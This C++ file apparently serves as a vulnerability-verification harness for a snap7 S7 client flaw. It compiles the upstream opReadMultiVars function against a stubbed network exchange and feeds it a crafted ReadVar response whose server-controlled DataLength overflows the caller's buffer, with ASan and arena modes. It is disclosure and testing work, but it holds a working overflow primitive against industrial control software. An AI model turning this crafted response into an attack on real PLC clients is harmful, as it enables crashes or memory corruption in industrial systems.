/* Direct-call harness for CVE-2026-131848 / GHSA-xr6p-cjp3-pvwg.
 *
 * TSnap7MicroClient::opReadMultiVars() is re-extracted VERBATIM from the pinned
 * upstream blob (davenardella/snap7 @ 30f37da, file src/core/s7_micro_client.cpp,
 * lines 307-431) into vuln/opReadMultiVars.inc by run.sh on every run. Nothing
 * in the function body is edited. The scaffolding below reconstructs only the
 * struct layouts, constants and member stubs from the pinned headers
 * (s7_types.h / s7_isotcp.h / s7_micro_client.h, same commit) so the slice can
 * compile standalone. No daemon, no listener, no real PLC, no network: the
 * "wire" response and the destination buffer are local test objects.
 *
 * isoExchangeBuffer() is replaced by a stub that copies a locally constructed
 * S7 ReadVar response into PDU.Payload and records its length in IsoSize,
 * exactly as the real routine leaves the received size there (issue #32).
 */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef uint8_t byte;
typedef uint8_t u_char;
typedef uint16_t word;
typedef uint32_t longword;
typedef uint8_t *pbyte;

/* Values copied verbatim from the pinned headers. */
const int MaxVars = 20;                 /* s7_types.h:49  */
const byte S7AreaDB = 0x84;             /* s7_types.h:45  */
const byte S7AreaCT = 0x1C;             /* s7_types.h:46  */
const byte S7AreaTM = 0x1D;             /* s7_types.h:47  */
const int S7WLBit = 0x01;               /* s7_types.h:51  */
const int S7WLByte = 0x02;              /* s7_types.h:52  */
const int S7WLCounter = 0x1C;           /* s7_types.h:59  */
const int S7WLTimer = 0x1D;             /* s7_types.h:60  */
const byte TS_ResBit = 0x03;            /* s7_types.h:212 */
const byte TS_ResReal = 0x07;           /* s7_types.h:215 */
const byte TS_ResOctet = 0x09;          /* s7_types.h:216 */
const byte PduType_request = 1;         /* s7_types.h:232 */
const byte pduFuncRead = 0x04;          /* s7_types.h:238 */
#define IsoPayload_Size 4096            /* s7_isotcp.h:38 */
const longword errCliTooManyItems    = 0x00400000;  /* s7_micro_client.h:37 */
const longword errCliSizeOverPDU     = 0x00700000;  /* s7_micro_client.h:40 */
const longword errCliInvalidPlcAnswer= 0x00800000;  /* s7_micro_client.h:41 */

#pragma pack(1)
typedef struct {
    byte P; byte PDUType; word AB_EX; word Sequence;
    word ParLen; word DataLen;
} TS7ReqHeader;

typedef struct {
    byte P; byte PDUType; word AB_EX; word Sequence;
    word ParLen; word DataLen; word Error;
} TS7ResHeader23;
typedef TS7ResHeader23* PS7ResHeader23;

typedef struct {
    byte ItemHead[3]; byte TransportSize; word Length;
    word DBNumber; byte Area; byte Address[3];
} TReqFunReadItem;

typedef struct {
    byte FunRead; byte ItemsCount; TReqFunReadItem Items[MaxVars];
} TReqFunReadParams, *PReqFunReadParams;

typedef struct { byte FunRead; byte ItemCount; } TResFunReadParams, *PResFunReadParams;

typedef struct {
    byte ReturnCode; byte TransportSize; word DataLength;
    byte Data[IsoPayload_Size - 17];
} TResFunReadItem, *PResFunReadItem;

typedef PResFunReadItem TResFunReadData[MaxVars];

typedef struct {
    int Area; int WordLen; int Result; int DBNumber;
    int Start; int Amount; void *pdata;
} TS7DataItem, *PS7DataItem;
#pragma pack()

const int ResHeaderSize23 = sizeof(TS7ResHeader23);   /* s7_types.h:362 */

struct TSnap7Job {
    int Op, Result; bool Pending; longword Time;
    int Area, Number, Start, WordLen, ID, Index;
    void *pData; int Amount; int *pAmount; int IParam;
};

static inline word SwapWord(word w) { return (word)((w >> 8) | (w << 8)); }

/* PDU layout: ISO TPKT header followed by the S7 payload. */
typedef struct {
    byte TPKT[4];
    byte Payload[IsoPayload_Size + 65536];
} TIsoFrame;

class TSnap7MicroClient {
private:
    word PDULength;
    TSnap7Job Job;
    word GetNextWord(void) { return 0x1234; }
    int CpuError(int e) { return e; }
    int DataSizeByte(int wl) { return wl == S7WLBit ? 1 : (wl == S7WLByte ? 1 : 2); }
    int isoExchangeBuffer(int, int);
    int opReadMultiVars(void);

public:
    TIsoFrame PDU;
    TS7ReqHeader *PDUH_out;
    int IsoSize;                 /* received payload size, set by stub */
    byte wire[IsoPayload_Size + 64];  /* attacker-chosen S7 ReadVar response */
    int wire_len;

    TSnap7MicroClient(void)
        : PDULength(IsoPayload_Size), PDUH_out((TS7ReqHeader *)PDU.Payload),
          IsoSize(0), wire_len(0)
    {
        memset(&PDU, 0, sizeof(PDU));
        memset(&Job, 0, sizeof(Job));
        memset(wire, 0, sizeof(wire));
    }
    void set_job(PS7DataItem item, int count) {
        Job.pData = item;
        Job.Amount = count;
    }
    void build_wire(word datalen, byte transport, byte seed) {
        memset(wire, 0, sizeof(wire));
        TS7ResHeader23 *h = (TS7ResHeader23 *)wire;
        TResFunReadParams *p = (TResFunReadParams *)(wire + sizeof(TS7ResHeader23));
        p->FunRead = pduFuncRead; p->ItemCount = 1;
        PResFunReadItem it = (PResFunReadItem)(wire + sizeof(TS7ResHeader23)
                                              + sizeof(TResFunReadParams));
        it->ReturnCode = 0xFF;                 /* item OK */
        it->TransportSize = transport;
        it->DataLength = SwapWord(datalen);    /* SERVER-CONTROLLED length */
        for (int i = 0; i < (int)sizeof(it->Data); i++)
            it->Data[i] = (byte)(seed + (byte)i);
        wire_len = sizeof(TS7ResHeader23) + sizeof(TResFunReadParams)
                 + 4 + 32;                      /* only 32 real payload bytes */
    }
    int run(void) { return opReadMultiVars(); }
    word wire_datalen(void) {
        PResFunReadItem it = (PResFunReadItem)(wire + sizeof(TS7ResHeader23)
                                              + sizeof(TResFunReadParams));
        return SwapWord(it->DataLength);
    }
};

int TSnap7MicroClient::isoExchangeBuffer(int, int) {
    if (wire_len <= 0 || wire_len > IsoPayload_Size) return -1;
    memcpy(PDU.Payload, wire, (size_t)wire_len);
    IsoSize = wire_len;
    return 0;
}

#ifdef FIXED_VARIANT
#include "fixed/opReadMultiVars.inc"
#else
#include "vuln/opReadMultiVars.inc"
#endif

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    word datalen = argc > 2 ? (word)strtoul(argv[2], NULL, 16) : 0xFFFF;
    int amount = argc > 3 ? atoi(argv[3]) : 1;
    byte transport = argc > 4 ? (byte)strtoul(argv[4], NULL, 0) : TS_ResOctet;
    byte seed = argc > 5 ? (byte)strtoul(argv[5], NULL, 16) : 0x5A;
    int asan_mode = (strcmp(mode, "asan") == 0);
    int safe_mode = (strcmp(mode, "safe") == 0);
    word effective = datalen;
    int word_size = 1; /* S7WLByte */
    int max_dest = amount * word_size;

    if (!safe_mode &&
        (transport != TS_ResOctet && transport != TS_ResReal && transport != TS_ResBit))
        effective = effective >> 3;

    printf("DATALEN=%u\n", (unsigned)datalen);
    printf("TRANSPORT_SIZE=%u\n", (unsigned)transport);
    printf("SLICE=%u\n", (unsigned)effective);
    printf("AMOUNT=%d\n", amount);
    printf("MAXDEST=%d\n", max_dest);
    printf("SLICE_OVER_MAXDEST=%d\n", (int)effective - max_dest);
    printf("WIRE_REAL_PAYLOAD=32\n");
    printf("MODE=%s\n", mode);
#ifdef FIXED_VARIANT
    printf("VARIANT=fixed\n");
#else
    printf("VARIANT=vuln\n");
#endif
    if (strcmp(mode, "arith") == 0) return 0;

    TSnap7MicroClient cli;
    cli.build_wire(safe_mode ? (word)amount : datalen, transport, seed);

    TS7DataItem item;
    memset(&item, 0, sizeof(item));
    item.Area = S7AreaDB; item.WordLen = S7WLByte; item.DBNumber = 1;
    item.Start = 0; item.Amount = amount;

    unsigned char *dest;
    unsigned char *alloc_base;
    if (asan_mode) {
        /* Own allocation: ASan must report the 65535-byte write 0 bytes after. */
        alloc_base = (unsigned char *)malloc((size_t)amount);
        dest = alloc_base;
    } else {
        /* Single arena: chosen wire bytes land at known offsets after dest. */
        alloc_base = (unsigned char *)malloc(200000);
        memset(alloc_base, 0xA5, 200000);
        dest = alloc_base + 1024;
    }
    item.pdata = dest;
    cli.set_job(&item, 1);

    int rc = cli.run();
    printf("RC=%d\n", rc);
    printf("ITEM_RESULT=%d\n", item.Result);

    if (!asan_mode) {
        printf("DEST0=%02x\n", dest[0]);
        printf("DEST17=%02x\n", dest[17]);
        printf("DEST64=%02x\n", dest[64]);
        printf("ARENA_AFTER=%02x%02x%02x%02x\n",
               dest[amount], dest[amount + 1], dest[amount + 2], dest[amount + 3]);
    }
    free(alloc_base);
    return 0;
}
